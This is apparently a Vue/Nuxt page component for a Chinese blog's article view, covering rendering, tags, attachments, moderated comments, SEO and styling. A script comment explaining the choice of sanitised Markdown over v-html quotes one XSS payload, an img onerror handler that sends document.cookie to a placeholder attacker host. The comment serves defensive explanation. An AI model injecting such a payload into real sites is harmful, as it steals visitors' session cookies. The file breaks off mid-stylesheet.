<template>
  <div class="art-page">
    <div class="art-wrap">

      <!-- 返回 -->
      <a class="back" href="/" @click.prevent="goHome">← 返回首页</a>

      <!-- ① 加载中 -->
      <div v-if="pending" class="state">加载中…</div>

      <!-- ② 没找到（不存在 / 是草稿 / 已下架 / 已删除，对访客来说都是同一种结果） -->
      <div v-else-if="!article" class="state">
        <b>这篇文章不见了</b>
        <p>{{ errMsg }}</p>
        <button class="btn" @click="goHome">回到首页</button>
      </div>

      <!-- ③ 正文 -->
      <article v-else class="doc">
        <header class="doc-head">
          <!-- 分类与标签放在同一行：它们是同一类东西（这篇属于哪儿），
               分开两行会让标题上方的空白被撑得很高。 -->
          <div class="doc-labels">
            <span v-if="article.categoryName" class="doc-cat">{{ article.categoryName }}</span>
            <!-- 标签：点它去首页看"同标签的其他文章"。
                 详情页自己只有一篇文章、没有筛选的能力，所以"按标签看"只能落到
                 首页那一套筛选状态上：跳过去时把 ?tagId= 带上，
                 首页的 useArticleFilter 启动时就从地址栏把它恢复出来
                 （和"别人甩一条带筛选参数的链接给你"走的是同一条路，没有第二套逻辑）。
                 【为什么写成 <a href> 而不是 <span>】内链是爬虫发现"标签下还有哪些文章"
                 的入口；保留 href 也让中键/右键新标签打开这些浏览器的原生行为照常可用，
                 .prevent 只是把左键点击换成站内路由跳转（和上面那个「返回首页」一样）。 -->
            <a
v-for="t in articleTags" :key="t.id" class="doc-tag"
               :href="tagLink(t.id)"
               :title="'查看「' + t.name + '」标签下的全部文章'"
               @click.prevent="goTag(t.id)">#{{ t.name }}</a>
          </div>
          <h1 class="doc-title">{{ article.title }}</h1>
          <div class="doc-meta">
            <span>{{ fmtDate(article.createTime) }}</span>
            <span class="dot">·</span>
            <span>{{ article.viewCount }} 次浏览</span>
            <span v-if="article.isTop === 1" class="doc-top">置顶</span>
          </div>
          <img v-if="article.cover" class="doc-cover" :src="article.cover" :alt="article.title" >
        </header>

        <MdPreview :model-value="article.content || ''" theme="dark" :language="zh_CN" />

        <!-- ==================== 附件 ====================
             【为什么放在正文之后、"完"之前】附件是正文的补充材料：
             读者读完正文正好看到"这篇还附了哪些文件"；放到评论区下面等于藏起来 ——
             几乎没人会翻过去。
             【为什么要 download 属性】它让浏览器**下载**而不是就地打开，
             与后端那层 `Content-Disposition: attachment` 是同一件事的两道保险：
             前端这道在某些场景（跨域、浏览器策略）下不生效，但不能因此不写。
             【为什么要 rel=noopener】附件地址现在是同源的，但保持这个习惯 ——
             哪天附件挪到别的域，这一行不用再改。 -->
        <section v-if="attachments.length" class="doc-attach">
          <h2 class="doc-attach-title">附件（{{ attachments.length }}）</h2>
          <ul class="doc-attach-list">
            <li v-for="item in attachments" :key="item.url">
              <a class="doc-attach-item" :href="item.url" :download="item.name" target="_blank" rel="noopener">
                <!-- 【为什么要有 title】文件名上限 100 字，而这一行是 ellipsis 截断的 ——
                     没有 title 的话，被截断之后读者**没有任何办法**看到全名
                     （与后台弹窗里那一处保持一致） -->
                <span class="doc-attach-name" :title="item.name">{{ item.name }}</span>
                <span class="doc-attach-size">{{ formatFileSize(item.size) }}</span>
              </a>
            </li>
          </ul>
        </section>
      </article>

      <footer v-if="article" class="doc-foot">
        <span>── 完 ──</span>
        <button class="btn" @click="goHome">回到首页</button>
      </footer>

      <!-- ==================== 评论区 ====================
           放在"完"的下面：读完正文顺手就能说话，不用再往下翻很久。
           `v-if="article"` 是必需的：文章不存在时（软 404）根本没有 articleId 可评论，
           而评论列表接口不带 articleId 会被后端拒（400）。 -->
      <section v-if="article" id="comments" class="cm">
        <h2 class="cm-title">
          评论
          <span v-if="commentTotal" class="cm-count">{{ commentTotal }}</span>
        </h2>

        <!-- ① 已通过的评论（这个接口只返回已通过的，待审核的谁都看不到） -->
        <div v-if="commentsPending && allComments.length === 0" class="cm-empty">评论加载中…</div>
        <div v-else-if="allComments.length === 0" class="cm-empty">
          还没有评论，来说点什么
        </div>
        <ul v-else class="cm-list">
          <li v-for="c in allComments" :key="c.id" class="cm-item">
            <div class="cm-head">
              <span class="cm-nick">{{ c.nickname }}</span>
              <span class="cm-time">{{ fmtTime(c.createTime) }}</span>
            </div>
            <!-- 【安全关键】这里是 {{ }} 插值，不是 v-html（详细理由见下面 script 段里的说明）。
                 插值会把内容当成**纯文本**放进 DOM，所以哪怕内容里写着 script 标签，
                 它也只会原样显示成一串字符，永远不会变成能执行的标签。
                 （注释里刻意不写尖括号：模板注释会被原样序列化进发给访客的 HTML，
                   写进去就等于往每个页面的源码里多塞一段看起来像标签的文本。） -->
            <p class="cm-body">{{ c.content }}</p>
          </li>
        </ul>

        <!-- 分页用「加载更多」而不是页码器：和首页一致，而且评论是对话，
             追加到末尾符合阅读顺序；翻页器会把用户"跳"到另一页、丢掉读到的位置。 -->
        <div v-if="hasMoreComments" class="cm-more">
          <button class="btn" :disabled="commentsLoadingMore" @click="loadMoreComments">
            {{ commentsLoadingMore ? '加载中…' : '加载更多评论' }}
          </button>
        </div>

        <!-- ② 发表表单（站点设置里把评论总开关关掉时，整块换成一句说明） -->
        <form v-if="settings.commentEnabled" class="cm-form" @submit.prevent="submitComment">
          <div class="cm-form-title">发表评论</div>

          <div class="cm-fields">
            <label class="cm-field">
              <span class="cm-label">昵称 <i>*</i></span>
              <input
v-model="commentForm.nickname" type="text"
                     :maxlength="COMMENT_LIMITS.nickname" placeholder="怎么称呼你" >
            </label>
            <label class="cm-field">
              <!-- 邮箱选填：强制填邮箱会显著降低评论意愿，而它对读者没有任何用处 -->
              <span class="cm-label">邮箱 <em>选填</em></span>
              <input
v-model="commentForm.email" type="text"
                     :maxlength="COMMENT_LIMITS.email" placeholder="不会公开，只用于回复你" >
            </label>
          </div>

          <textarea
v-model="commentForm.content" class="cm-textarea"
                    :maxlength="COMMENT_LIMITS.content" rows="4"
                    placeholder="说点什么…（最多 1000 字）" />

          <div class="cm-actions">
            <span class="cm-hint">{{ commentForm.content.length }} / {{ COMMENT_LIMITS.content }}</span>
            <button type="submit" class="cm-submit" :disabled="commentSubmitting">
              {{ commentSubmitting ? '提交中…' : '发表评论' }}
            </button>
          </div>

          <!-- 失败提示（校验没过、后端 400/404/429 都走这里）。
               429 复用 app/utils/apiError.ts 里那句「请求过于频繁」——
               绝不能说成「网络异常」：限流是"服务端好好的、让你等一会儿"，
               说成网络故障会把人往"查网线、重启路由器"的方向带。 -->
          <p v-if="commentError" class="cm-alert err">{{ commentError }}</p>

          <!-- 【提交成功后必须说清楚，不能让用户以为没发出去】
               后端默认把评论存成【待审核】（status=0），所以它不会立刻出现在上面的列表里。
               如果只清空输入框、什么都不说，用户看到的就是"我发的评论没了"，
               然后很可能再发一遍 —— 于是同一条评论进了两次审核队列。
               所以这里三件事一起做：① 一句话说明 ② 把刚提交的那条显示出来
               ③ 挂上「待审核」标记，并说明它为什么不在上面的列表里。 -->
          <p v-if="commentDone" class="cm-alert ok">
            {{ COMMENT_PENDING_NOTICE }} —— 站长审核通过后才会出现在上面的评论列表里。
          </p>
        </form>

        <!-- 【评论总开关关掉时的替代说明】
             ⚠️ 两点刻意的语义，别当成漏了：
             ① **已有的评论仍然显示在上面** —— "关闭评论"的意思是"不再接收新评论"，
                不是"把历史评论藏起来"。既有评论是站点内容的一部分，
                而且后端那边也只是拒绝新的提交（不是把数据删了）
             ② 这只是**前端的表现**：真正的拦截在后端（POST /comment 会返回
                「评论已关闭」的业务错误）。只藏表单不拦接口等于一个假开关 ——
                谁都能直接调接口绕过它 -->
        <p v-else class="cm-closed">评论已关闭，暂时不能发表新的评论。</p>

        <!-- ③ 我这次提交的评论（待审核）：单独一块，不混进公开列表，
             免得用户以为"别人已经看到了" -->
        <div v-if="myPending.length" class="cm-mine">
          <div class="cm-mine-title">你的评论（仅你可见）</div>
          <ul class="cm-list">
            <li v-for="c in myPending" :key="c.id" class="cm-item pending">
              <div class="cm-head">
                <span class="cm-nick">{{ c.nickname }}</span>
                <span class="cm-badge">待审核</span>
                <!-- 【为什么这里要兜一个「刚刚」】联调实测发现：POST /comment 的响应里
                     createTime 是 null（插入后没有把数据库里刚生成的时间回填到返回对象上），
                     而前台列表接口返回的评论是有时间的。
                     照原样显示的话，这一行会出现一个空白的时间位（看着像页面坏了）。
                     刚提交的评论本来就是"刚刚"，比显示一个"—"更准确。
                     （这属于对后端返回形状的兼容，不是掩盖问题 —— 已记进汇报。） -->
                <span class="cm-time">{{ fmtTime(c.createTime) || '刚刚' }}</span>
              </div>
              <p class="cm-body">{{ c.content }}</p>
            </li>
          </ul>
        </div>
      </section>

    </div>
  </div>
</template>

<script setup>
// MdPreview 是"只读渲染"版，不带动编辑器那套（体积小很多）。
// 样式引 preview.css 而不是 style.css —— 详情页不需要编辑器样式。
import { MdPreview, zh_CN } from 'md-editor-v3'
import 'md-editor-v3/lib/preview.css'

/*
 * 【安全关键】正文为什么用 MdPreview 渲染，而不是自己 v-html？
 *
 * Markdown 里是可以塞原始 HTML 的 —— 比如写一句
 *     <img src=x onerror="fetch('http://坏人/'+document.cookie)">
 * 如果直接 v-html 塞进页面，这段脚本会在【每一个读者】的浏览器里执行。
 * 你自己写的文章当然没事，但这是博客系统最经典的 XSS 入口。
 *
 * MdPreview 内部接了 xss 库做白名单过滤，危险标签和属性会被清掉。
 * 自己写 v-html 就必须自己接 DOMPurify —— 一旦漏了就是全站 XSS。
 *
 * 【为什么这段注释写在这里而不是模板里？】
 * 模板里的 HTML 注释会被原样序列化进最终 HTML 发给每个访客
 * （上面那句 onerror 示例就因此出现在了页面源码里）。
 * JS 注释则会被打包器剥掉。凡是带敏感示例的说明，都写进 <script>。
 */

const route = useRoute()
const { request } = useApi()

/**
 * 站点设置（文章页要用到一样：评论总开关）。
 *
 * 【为什么评论开关值得单独接线】它是"整站级"的开关，而文章页是它唯一生效的地方：
 *   关掉之后这一页不再显示发表表单（已有的评论照常显示，见模板里那段说明）。
 * 【为什么这里调 useSiteSettings 不多打一次接口】外壳已经用同一个 key 取过了，
 *   同 key 就是同一份数据（那段 getCachedData 保证服务端也只打一次）。
 * 【读不到时怎么办】归一化把"读不到"当成**开启**（就是改动前的行为）——
 *   不能让接口抖一下就把全站的评论框藏起来。
 */
const { settings } = useSiteSettings()

/**
 * 【为什么正文与评论都用 useAsyncData（服务端渲染），而不是 onMounted + ref】
 * 因为这是内容，不是控件 —— 内容必须出现在服务端返回的 HTML 里，否则：
 *   ① 搜索引擎抓到的是一张空壳，文章等于没被收录（SSR 博客的核心价值就在这）
 *   ② 首屏会先闪一下"加载中"再出内容，观感差
 * useAsyncData 会在服务端【等数据回来再渲染】，HTML 里直接带着正文与评论。
 *
 * 【key 里带上文章 id】它是"这份数据属于哪篇文章"的标识，
 * 写死成 'article' 的话，从第 12 篇点到第 13 篇会拿到上一篇的缓存。
 *
 * 【评论也用同一套，但有代价（这个选择不是白来的）】
 *   · 评论请求会并进详情页 SSR 的关键路径 —— 所以下面把它和正文【并行】发起，
 *     串行 await 会让首屏多一个往返
 *   · payload 里多了一份评论数据（第一页 10 条，可接受）
 *   · 接口失败时不能连累正文：normalizeCommentPage() 把失败整成"空列表"，
 *     页面最多显示"还没有评论"，正文照常渲染
 *   · key 必须和正文的 key（`article-12`）区分开，撞了会共用同一份缓存
 *
 * 【评论内容为什么用 {{ }} 插值显示，绝不能 v-html（安全关键）】
 *   评论是【任何人都能提交】的内容（评论接口对游客开放）。
 *   后端在入库前已经把 < > & 转义成实体（存进去的就是 &lt; 这种），
 *   所以前端【照原样显示】就是安全的：
 *     · 用 {{ }} 插值 = 把字符串当纯文本放进 DOM，内容里写 <script> 也只会显示成字
 *     · 用 v-html = 把字符串当 HTML 解析，等于让每个访客的浏览器执行别人的输入
 *   两条附带的纪律：
 *     · 【不要反转义】把 &lt; 还原成 < 再插值，正好把上面那层保护拆掉了
 *     · 【不要再做一次 HTML 转义】那会把 &lt; 显示成 &amp;lt;，用户看到一堆实体码
 */
const COMMENT_PAGE_SIZE = 10

/** 拉某页评论（公开接口，必须带 articleId，否则后端直接 400） */
const requestComments = (pageNo) => request('/comment/list', {
  params: { articleId: route.params.id, page: pageNo, size: COMMENT_PAGE_SIZE },
})

const articleAsync = useAsyncData(
  'article-' + route.params.id,
  () => request('/article/' + route.params.id),
)

const commentsAsync = useAsyncData(
  'article-comments-' + route.params.id,
  () => requestComments(1),
)

// 两个请求互不依赖 → 并行发起、一起 await（串行会让首屏多一个往返）
await Promise.all([articleAsync, commentsAsync])

const { data: res, pending } = articleAsync
const { data: commentRes, pending: commentsPending } = commentsAsync

const article = computed(() => (res.value?.ok ? res.value.data : null))
const errMsg = computed(() => res.value?.message || '它可能已被删除，或者还只是一篇没发布的草稿。')

/**
 * 这篇文章身上的标签。
 * 【为什么要 Array.isArray 兜一道】后端保证"没有标签时是空数组"，
 * 但详情接口一旦挂掉、或者以后 tags 变成 null / 别的结构，直接 v-for 会把
 * 整个详情页渲染带崩 —— 而正文才是这一页的全部价值，
 * 为了几颗标签把正文也弄没了是绝对不能接受的。兜成空数组最差只是不显示标签。
 */
const articleTags = computed(() => (Array.isArray(article.value?.tags) ? article.value.tags : []))

/**
 * 这篇文章的附件清单（后端详情接口返回）。
 * 【为什么要兜底成数组】附件是后加的字段：接口还没更新、或者这篇文章确实没有附件时，
 * `article.value.attachments` 是 undefined —— 模板里写 `attachments.length` 会直接抛错，
 * 把整个文章页带崩。一个**可选字段不该有这个能力**（与上面 articleTags 同一条理由）。
 */
const attachments = computed(() => (Array.isArray(article.value?.attachments) ? article.value.attachments : []))

// ================================================================
//  评论区
// ================================================================

/** 第一页（服务端渲染取好的那份），失败时是"空列表 + 总数 0" */
const firstCommentPage = computed(() => normalizeCommentPage(commentRes.value))
const commentTotal = computed(() => firstCommentPage.value.total)

/** 「加载更多」追加进来的评论（公开列表是【时间正序】，所以下一页追加在后面是对的） */
const moreComments = ref([])
const commentsLoadingMore = ref(false)

/** 页面上要显示的评论 = 第一页 + 追加的 */
const allComments = computed(() => [...firstCommentPage.value.records, ...moreComments.value])

/** 还有没有下一页：已显示的条数 < 总条数 就说明还有 */
const hasMoreComments = computed(() => allComments.value.length < commentTotal.value)

/**
 * 加载下一页评论并追加到列表末尾。
 * 【为什么用普通请求而不是 useAsyncData】它不属于"这一页的首屏数据"，
 * 服务端只渲染第一页，也不需要进 payload —— 追加语义用一次普通请求最直白。
 */
const loadMoreComments = async () => {
  commentsLoadingMore.value = true
  // 【下一页是第几页】已经加载的条数 ÷ 每页条数，向上取整 = "已经取了几页"，
  // 再 +1 就是下一页。
  // 【为什么不能写成 floor(len / size) + 1】第一页只有 2 条（页大小是 10）时，
  // floor(2/10)+1 = 1 —— 又把第 1 页拉了一遍，于是同两条评论在页面上出现两遍。
  // 这个 bug 只在"某一页不满一整页"时才出现，而最后一页永远不满一整页。
  // 【为什么要 max(1, ...)】万一第一页返回 0 条（后端异常）而 total 又是正的，
  // ceil(0/10) 是 0，不兜一下就会重复请求第 1 页。
  const nextPage = Math.max(1, Math.ceil(allComments.value.length / COMMENT_PAGE_SIZE)) + 1
  const res = await requestComments(nextPage)
  commentsLoadingMore.value = false
  if (!res.ok) return
  moreComments.value = [...moreComments.value, ...normalizeCommentPage(res).records]
}

// ---------- 发表评论 ----------
const commentForm = reactive({ nickname: '', email: '', content: '' })
/** 校验失败 / 提交失败的提示（一次只显示一条） */
const commentError = ref('')
/** 提交成功的提示：必须明确告诉用户"在等审核"，否则他会以为没发出去 */
const commentDone = ref(false)
const commentSubmitting = ref(false)
/** 本次会话里提交成功的评论（都是待审核状态，单独显示，不混进公开列表） */
const myPending = ref([])

const submitComment = async () => {
  commentError.value = ''
  commentDone.value = false

  // 先跑本地校验（纯函数，有单测）：能当场说清的错就不必走一次网络
  const problem = validateCommentForm(commentForm)
  if (problem) {
    commentError.value = problem.message
    return
  }

  // 防连点：按钮上虽然有 :disabled，但两次点击落在同一帧时它还没重绘。
  // 评论接口有 20 次/分钟的限流，多打一次就少一次配额。
  if (commentSubmitting.value) return
  commentSubmitting.value = true

  const res = await request('/comment', {
    method: 'POST',
    body: normalizeCommentForm(commentForm, route.params.id),
  })

  commentSubmitting.value = false

  if (res.ok) {
    // 【为什么把返回的这条放进 myPending 而不是刷新列表】
    //   刚提交的评论 status=0（待审核），而公开列表接口只返回已通过的 ——
    //   刷新列表也看不到它。所以直接把接口返回的这条显示出来（它带着 status:0），
    //   用户才看得见"我的话确实提交成功了"。
    myPending.value = [res.data, ...myPending.value]
    commentDone.value = true
    // 只清内容，昵称与邮箱留着：同一个人常常连着说几句
    commentForm.content = ''
    return
  }

  // 【429 必须说成"请求过于频繁"，绝不能落到"网络异常"】
  //   这个接口是 20 次/分钟的【整站】配额，很容易撞到；而限流是
  //   "服务端好好的、只是让你等一会儿"，说成网络故障会引导用户去查网络、反复重试，
  //   每一次重试还会再吃掉一个名额。useApi 已经按 HTTP 429 分好支并给了文案，
  //   这里再用 RATE_LIMITED_MESSAGE 兜一道：万一后端/proxy 返回的 429 没带 body，
  //   提示里也必须有"频繁"这两个字。
  commentError.value = res.rateLimited
    ? (res.message || RATE_LIMITED_MESSAGE)
    : (res.message || '提交失败，请稍后再试')
}

/*
 * 【SEO】标题、摘要、og、canonical 都交给 useSeoMetaFor 拼（规则在 app/utils/seo.ts）。
 *
 * 改之前这里只有一句 useHead({ title })，没有 description / og / canonical：
 * 链接分享到微信就是一行光秃秃的地址，搜索引擎也只能自己从正文里截一段当摘要。
 *
 * 两个细节：
 *   · description 用文章自己的 summary；没写摘要时回落到站点描述
 *     （空 description 等于把"这段话"交给抓取方随便猜）
 *   · 封面是相对路径（/uploads/xxx.png），og:image 要求绝对地址，
 *     所以交给 absoluteUrl 拼一次 —— 抓取方拿到相对路径会直接当成没有图
 */
useSeoMetaFor(() => ({
  path: '/article/' + route.params.id,
  title: article.value?.title,
  description: article.value?.summary,
  type: 'article',
  image: article.value?.cover,
  // 【软 404 的页面不该被索引】文章不存在 / 是草稿 / 已下架时，这个地址
  // 没有任何内容可给搜索引擎 —— 但下面那个 createError 抛出去之后，
  // 错误页的 head 由 error.vue 接管，这里先声明 noindex 更稳妥
  noindex: !article.value,
}))

/*
 * 【SEO 关键】文章不存在时，必须让服务端返回真正的 HTTP 404。
 *
 * 如果只是渲染一句"文章不见了"但状态码仍是 200，这叫【软 404】：
 * 搜索引擎会认为"这个 URL 的内容就是一张报错图"，然后把它收录进索引，
 * 结果你的 404 页面反而被搜出来了。
 *
 * 用 createError 抛出去，Nuxt 会：
 *   ① 把 HTTP 状态码设成 404
 *   ② 渲染 app/error.vue（我们自己写的、和站点同风格的错误页）
 * 这比手写 setResponseStatus 可靠 —— 后者在页面正常渲染时会被覆盖掉（实测无效）。
 */
if (res.value && !res.value.ok) {
  throw createError({
    statusCode: res.value.code === 404 ? 404 : 500,
    statusMessage: '文章不存在',
    data: { from: 'article' },
  })
}

const goHome = () => navigateTo('/')

/**
 * 去首页按这个标签筛文章。
 * 【为什么用对象形式的 navigateTo】tagId 必须走 query（首页的筛选条件全都在 query 里），
 * 拼字符串 '/?tagId=3' 也能用，但对象形式让"这一个是路径、那一个是查询参数"
 * 在代码里就分得清清楚楚，以后加第二个条件（比如同时带 categoryId）不用改写法。
 * 【为什么 String() 一下】route.query 的值只有字符串，先转成字符串能让
 * "生成出来的地址"和"路由解析出来的地址"完全一致（否则测试里断言会对不上）。
 */
const goTag = (id) => navigateTo({ path: '/', query: { tagId: String(id) } })

/** 标签链接的 href：给中键/右键/爬虫用的真实地址（左键点击走上面的 goTag） */
const tagLink = (id) => `/?tagId=${id}`

const fmtDate = (t) => (t ? String(t).replace('T', ' ').slice(0, 10) : '')

/**
 * 评论的时间要精确到分钟（不像卡片上只显示到天）：
 * 评论区里两条评论常常只差几分钟，只显示日期的话先后顺序看不出来，
 * 时间正序也就白排了。后端给的是 "2026-09-10T05:03:19"，截到分钟即可。
 */
const fmtTime = (t) => (t ? String(t).replace('T', ' ').slice(0, 16) : '')
</script>

<style scoped>
.art-page { min-height: 70vh; }
/* 阅读栏宽度。
   【为什么从 860 提到 960】站长反馈"文章详情页有点小、不那么好看" —— 860px 是
   早期按"一行 40 来个字最舒服"定的，但本项目正文用的是 16px 中文 + 1.9 行高，
   860px 下每行不到 35 个字、两侧空白显得很空。960px 在 1440 及以上的屏上
   观感明显更"撑得开"，而在窄屏上本来就走下面的媒体查询，不受影响。
   ⚠️ 再宽就要开始伤可读性了（一行超过 ~45 个中文字，眼睛回行会找不准行）——
   所以这个数字不是越大越好，960 是"看起来大气"与"读起来不累"之间的取值。 */
.art-wrap { max-width: 960px; margin: 0 auto; padding: 32px 24px 64px; }

.back {
  display: inline-block; margin-bottom: 18px; color: var(--muted);
  font-size: 14px; text-decoration: none; cursor: pointer; transition: color .2s;
}
.back:hover { color: var(--accent); }

.state { text-align: center; padding: 80px 24px; border-radius: 20px; color: var(--muted); }
.state b { display: block; font-size: 20px; color: var(--ink); margin-bottom: 10px; }
.state p { margin: 0 0 22px; font-size: 14px; line-height: 1.7; }
.btn {
  background: rgba(30,47,82,.66); border: 1px solid rgba(180,210,245,.18);
  color: var(--ink); padding: 9px 26px; border-radius: 999px; cursor: pointer;
  font-size: 14px; transition: border-color .2s, color .2s;
}
.btn:hover { border-color: rgba(242,193,78,.5); color: var(--accent); }

/* 【性能考虑】正文面板用"几乎不透明的深色底"而不是 .glass 毛玻璃。
   原因：文章很长，一整块大面积的 backdrop-filter 会对背后的播放中视频
   做实时重采样 —— 这是首页那次卡顿的同款问题，而且面积还更大。
   阅读场景本来也需要更实的背景来保证对比度。 */
.doc {
  /* 0.96 而不是 0.88：正文是长文，背景透光率哪怕只有 12%，
     在一张高对比度的背景图上也会明显干扰阅读（实测截图里画作清晰可见）。
     这里故意不做 backdrop-filter —— 一整块大面积实时模糊会对背后的播放中视频
     逐帧重采样，是首页那次卡顿的同款问题，而且面积更大。 */
  background: rgba(13,22,43,.96);
  border: 1px solid rgba(180,210,245,.14);
  border-radius: 22px;
  padding: 44px 52px 52px;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.06), 0 24px 60px rgba(0,0,0,.35);
}
.doc-head { margin-bottom: 28px; padding-bottom: 24px; border-bottom: 1px solid rgba(150,190,240,.12); }
/* 分类与标签同一行，窄屏自动换行（标签多的文章不该把标题挤下去） */
.doc-labels { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-bottom: 14px; }
.doc-cat {
  display: inline-block; font-size: 12px; color: #cfe0f0;
  border: 1px solid rgba(180,210,245,.25); border-radius: 999px;
  padding: 2px 12px;
}
/* 标签做得比分类淡一些：# 前缀 + 实心底，一眼能看出"这是标签、而且能点" */
.doc-tag {
  display: inline-block; font-size: 12px; color: #cfe0f0; text-decoration: none;
  background: rgba(242,193,78,.14); border-radius: 999px; padding: 3px 12px;
  transition: background .2s, color .2s;
}
.doc-tag:hover { background: rgba(242,193,78,.3); color: var(--ink); }
.doc-title { font-size: 32px; font-weight: 800; line-height: 1.35; margin: 0 0 14px; color: var(--ink); }
.doc-meta { display: flex; align-items: center; gap: 10px; color: var(--muted); font-size: 13px; flex-wrap: wrap; }
.doc-meta .dot { opacity: .5; }
.doc-top { color: var(--accent); border: 1px solid rgba(242,193,78,.45); border-radius: 999px; padding: 1px 10px; font-size: 12px; }
.doc-cover { width: 100%; border-radius: 16px; margin-top: 22px; display: block; }

/* 附件区：在正文之后、"完"之前。
   每一项都是"文件名（可省略号）+ 大小"的**整行链接** —— 整行可点比只有文字可点更好按，
   手机上尤其明显。 */
.doc-attach { margin-top: 34px; border-top: 1px solid rgba(150,190,240,.12); padding-top: 22px; }
.doc-attach-title { font-size: 15px; font-weight: 700; color: var(--ink); margin: 0 0 14px; }
.doc-attach-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 10px; }
.doc-attach-item { display: flex; align-items: center; gap: 12px; padding: 10px 14px; border-radius: 12px; background: rgba(255,255,255,.04); border: 1px solid rgba(150,190,240,.14); color: var(--muted); text-decoration: none; transition: border-color .2s ease, color .2s ease; }
.doc-attach-item:hover { border-color: var(--accent); color: var(--accent); }
/* 文件名要能截断：flex 子项默认 min-width 是 auto，不写 min-width: 0 就会把整行撑破 */
.doc-attach-name { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.doc-attach-size { flex: 0 0 auto; font-size: 12px; font-variant-numeric: tabular-nums; }
.doc-foot { text-align: center; margin-top: 34px; color: var(--muted); font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 18px; letter-spacing: 2px; }

/* ==================== 评论区 ====================
   和正文同一个底色（不做毛玻璃）：理由同 .doc —— 大面积 backdrop-filter 会对
   背后的播放中视频逐帧重采样，而这里同样是一整块长内容。 */
.cm {
  margin-top: 28px;
  background: rgba(13,22,43,.96);
  border: 1px solid rgba(180,210,245,.14);
  border-radius: 22px;
  padding: 32px 44px 36px;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.06), 0 24px 60px rgba(0,0,0,.35);
}
.cm-title { font-size: 20px; font-weight: 800; color: var(--ink); margin: 0 0 20px; }
.cm-count {
  margin-left: 8px; font-size: 12px; font-weight: 600; color: var(--muted);
  border: 1px solid rgba(180,210,245,.25); border-radius: 999px; padding: 2px 10px;
}
.cm-empty { color: var(--muted); font-size: 14px; text-align: center; padding: 34px 0; }

.cm-list { list-style: none; margin: 0; padding: 0; }
.cm-item { padding: 14px 0; border-bottom: 1px solid rgba(150,190,240,.10); }
.cm-item:last-child { border-bottom: none; }
.cm-head { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
.cm-nick { color: var(--accent); font-size: 13px; font-weight: 700; }
.cm-time { color: var(--muted); font-size: 12px; }
/* 「待审核」标记：它要显眼，因为这条评论别人看不到，只有作者自己看得到 */
.cm-badge {
  font-size: 11px; color: #0a1224; background: var(--accent);
  border-radius: 999px; padding: 1px 8px; font-weight: 700;
}
/* 【pre-wrap 是必需的】评论内容里可以有换行，默认的 white-space: normal
   会把换行"吃掉"，用户写的一段一段话会被拼成一整行。
   pre-wrap 既保留换行与连续空格，又会在行尾自动折行（不像 pre 那样横向溢出）。 */
.cm-body { margin: 0; color: var(--ink); font-size: 14px; line-height: 1.8; white-space: pre-wrap; word-break: break-word; }
/* 待审核的那条整体压暗一点：一眼能看出它和上面那些"已公开"的不是一回事 */
.cm-item.pending .cm-body { color: var(--muted); }

.cm-more { text-align: center; margin: 18px 0 4px; }
.cm-more .btn:disabled { opacity: .6; cursor: default; }

/* 发表表单 */
.cm-form { margin-top: 26px; padding-top: 22px; border-top: 1px solid rgba(150,190,240,.14); }
/* 评论关闭时的说明：与"还没有评论"那句用同一种低调样式，它不是一个错误状态 */
.cm-closed { margin-top: 26px; padding: 18px 0 4px; border-top: 1px solid rgba(150,190,240,.14); color: var(--muted); font-size: 14px; text-align: center; }
.cm-form-title { font-weight: 700; color: var(--ink); margin-bottom: 14px; }
.cm-fields { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.cm-field { display: flex; flex-direction: column; gap: 6px; }
.cm-label { color: var(--muted); font-size: 12px; }
.cm-label i { color: #f56c6c; font-style: normal; }
.cm-label em { font-style: normal; opacity: .7; }
.cm-field input, .cm-textarea {
  background: rgba(255,255,255,.06);
  border: 1px solid rgba(150,190,240,.18);
  border-radius: 12px; padding: 10px 12px; color: var(--ink);
  font-size: 14px; font-family: inherit; outline: none;
  transition: border-color .2s;
}
.cm-field input:focus, .cm-textarea:focus { border-color: rgba(242,193,78,.6); }
.cm-field input::placeholder, .cm-textarea::placeholder { color: var(--muted); }
/* resize: vertical —— 只让用户往高里拖，横向拖会把 860px 的排版拖坏 */
.cm-textarea { margin-top: 12px; width: 100%; resize: vertical; line-height: 1.7; box-sizing: border-box; }

.cm-actions { display: flex; align-items: center; justify-content: space-between; margin-top: 12px; }
.cm-hint { color: var(--muted); font-size: 12px; }
.cm-submit {
  background: linear-gradient(135deg, var(--accent), var(--cyan));
  border: none; color: #0a1224; font-weight: 700; font-size: 14px;
  padding: 9px 28px; border-radius: 999px; cursor: pointer;
  transition: opacity .2s;
}
.cm-submit:disabled { opacity: .6; cursor: default; }

/* 表单下方的提示：错误用红、成功用金。
   【为什么要放在按钮下面】提交完用户的目光就在那里，提示出现在他正在看的位置，
   不用去找"提示弹到哪儿去了"。 */
.cm-alert { font-size: 13px; line-height: 1.7; margin: 12px 0 0; }
.cm-alert.err { color: #f56c6c; }
.cm-alert.ok { color: var(--accent); }

.cm-mine { margin-top: 22px; }
.cm-mine-title { color: var(--muted); font-size: 12px; margin-bottom: 6px; }

/* ===== md-editor-v3 预览区暗色适配 =====
   和后台编辑器用同一套主题变量，保证文章在"后台预览"和"前台阅读"里长得一样。 */
:deep(.md-editor-dark) {
  --md-bk-color: transparent;
  --md-color: #dce7f8;
  --md-border-color: rgba(150,190,240,.16);
  --md-hover-color: #ffffff;
  --md-scrollbar-bg-color: rgba(255,255,255,.04);
  --md-scrollbar-thumb-color: rgba(150,190,240,.28);
}
/* 正文排版。
   【为什么正文是 16px / 1.9】站长反馈"详情页有点小"。正文是这一页的主角，
   15px 在 960px 的栏宽里显得单薄；16px 是中文长文阅读的常见下限，
   行高跟着提到 1.9（中文没有西文的词间空白，行距太小会糊成一片）。 */
:deep(.md-editor-preview) { background: transparent; font-size: 16px; line-height: 1.9; }
:deep(.md-editor-preview h1),
:deep(.md-editor-preview h2),
:deep(.md-editor-preview h3) { color: var(--ink); }
:deep(.md-editor-preview a) { color: var(--accent); }
:deep(.md-editor-preview code) { color: #8be9fd; }
:deep(.md-editor-preview blockquote) {
  border-left: 3px solid var(--accent);
  background: rgba(242,193,78,.06);
  color: var(--muted);
}

/* 窄屏：减小内边距，标题降字号 */
@media (max-width: 720px) {
